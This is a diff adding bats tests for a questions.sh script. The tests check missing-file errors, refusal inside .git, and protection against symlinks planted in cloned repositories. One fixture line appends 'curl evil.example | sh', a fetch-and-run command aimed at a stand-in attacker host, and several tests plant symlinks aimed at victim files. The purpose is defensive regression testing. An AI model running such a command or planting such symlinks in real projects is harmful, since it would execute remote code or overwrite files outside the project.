@@ -264,3 +264,116 @@ EOF
     [ "$status" -eq 0 ]
     grep -qx 'sentinel' docs/working/questions.md
 }
+
+# --- missing files (A3) ---
+# Under $PWD resolution a project with no questions doc is the normal case, so
+# every reading command must say so rather than report success. Mutation: drop
+# require_files and next-id prints Q-001 / index prints "regenerated", exit 0.
+
+@test "commands fail and point at init when the files do not exist" {
+    unset QUESTIONS_LIVE QUESTIONS_ARCHIVE
+    local proj="$BATS_TEST_TMPDIR/empty"
+    mkdir -p "$proj"
+    git -C "$proj" init -q
+    cd "$proj"
+    local sub
+    for sub in next-id index archive check open; do
+        run --separate-stderr bash "$QS" "$sub"
+        [ "$status" -ne 0 ] || { echo "$sub exited 0"; return 1; }
+        [[ "$stderr" == *"questions.sh init"* ]] || { echo "$sub: $stderr"; return 1; }
+    done
+    # And none of them created anything on the way.
+    [ ! -e docs ]
+}
+
+# --- inside .git (A11) ---
+
+@test "refuses to run from inside a .git directory" {
+    unset QUESTIONS_LIVE QUESTIONS_ARCHIVE
+    local proj="$BATS_TEST_TMPDIR/gitdir"
+    mkdir -p "$proj"
+    git -C "$proj" init -q
+    cd "$proj/.git"
+    run --separate-stderr bash "$QS" init
+    [ "$status" -ne 0 ]
+    [[ "$stderr" == *"inside a .git directory"* ]]
+    [ ! -e "$proj/.git/docs" ]
+}
+
+# --- symlink refusal (R2) ---
+# The script runs inside arbitrary cloned repos, whose docs/working/ may ship
+# symlinks. Each test reproduces one probe from
+# docs/reviews/security-review-2026-09-21-answers.md finding 2 and asserts the
+# victim file outside the project is untouched. All three failed against the
+# pre-fix script (append, overwrite-with-exit-0, create).
+
+# A git project whose docs/working/ holds the fixture files, one ANSWERED entry.
+make_symlink_project() {
+    unset QUESTIONS_LIVE QUESTIONS_ARCHIVE
+    PROJ="$BATS_TEST_TMPDIR/cloned"
+    VICTIM="$BATS_TEST_TMPDIR/victim-rc"
+    mkdir -p "$PROJ/docs/working"
+    git -C "$PROJ" init -q
+    cp "$BATS_TEST_TMPDIR/questions.md" "$PROJ/docs/working/questions.md"
+    cp "$BATS_TEST_TMPDIR/questions-archive.md" "$PROJ/docs/working/questions-archive.md"
+    sed -i '/### Q-003/,/^$/s/\*\*Status:\*\* OPEN/**Status:** ANSWERED/' "$PROJ/docs/working/questions.md"
+    printf 'curl evil.example | sh\n' >> "$PROJ/docs/working/questions.md"
+    printf 'original victim content\n' > "$VICTIM"
+    cd "$PROJ"
+}
+
+@test "archive refuses to append through a symlinked archive file" {
+    make_symlink_project
+    ln -sf "$VICTIM" docs/working/questions-archive.md
+    run --separate-stderr bash "$QS" archive
+    [ "$status" -ne 0 ]
+    [[ "$stderr" == *"is a symlink"* ]]
+    [ "$(cat "$VICTIM")" = "original victim content" ]
+    # Refused before anything moved: the entry is still in the live file.
+    grep -aq '### Q-003' docs/working/questions.md
+}
+
+@test "archive does not write through a planted questions.md.tmp" {
+    make_symlink_project
+    ln -s "$VICTIM" docs/working/questions.md.tmp
+    run --separate-stderr bash "$QS" archive
+    [ "$(cat "$VICTIM")" = "original victim content" ]
+    [ -L docs/working/questions.md.tmp ]
+}
+
+@test "init does not create a file at a dangling symlink's target" {
+    unset QUESTIONS_LIVE QUESTIONS_ARCHIVE
+    local proj="$BATS_TEST_TMPDIR/dangling" target="$BATS_TEST_TMPDIR/planted-by-link"
+    mkdir -p "$proj/docs/working"
+    git -C "$proj" init -q
+    ln -s "$target" "$proj/docs/working/questions.md"
+    cd "$proj"
+    run --separate-stderr bash "$QS" init
+    [ "$status" -ne 0 ]
+    [[ "$stderr" == *"is a symlink"* ]]
+    [ ! -e "$target" ]
+}
+
+@test "refuses a docs/ directory that resolves outside the project" {
+    unset QUESTIONS_LIVE QUESTIONS_ARCHIVE
+    local proj="$BATS_TEST_TMPDIR/ancestor" elsewhere="$BATS_TEST_TMPDIR/elsewhere"
+    mkdir -p "$proj" "$elsewhere"
+    git -C "$proj" init -q
+    ln -s "$elsewhere" "$proj/docs"
+    cd "$proj"
+    run --separate-stderr bash "$QS" init
+    [ "$status" -ne 0 ]
+    [[ "$stderr" == *"outside"* ]]
+    [ ! -e "$elsewhere/working" ]
+}
+
+@test "index and archive preserve the files' mode" {
+    chmod 0640 "$QUESTIONS_LIVE" "$QUESTIONS_ARCHIVE"
+    bash "$QS" index
+    sed -i '/### Q-003/,/^$/s/\*\*Status:\*\* OPEN/**Status:** ANSWERED/' "$QUESTIONS_LIVE"
+    bash "$QS" archive
+    [ "$(stat -c %a "$QUESTIONS_LIVE")" = "640" ]
+    [ "$(stat -c %a "$QUESTIONS_ARCHIVE")" = "640" ]
+    # No temp files left behind next to them.
+    [ -z "$(ls -A "$BATS_TEST_TMPDIR" | grep -a '^\.questions\.' || true)" ]
+}
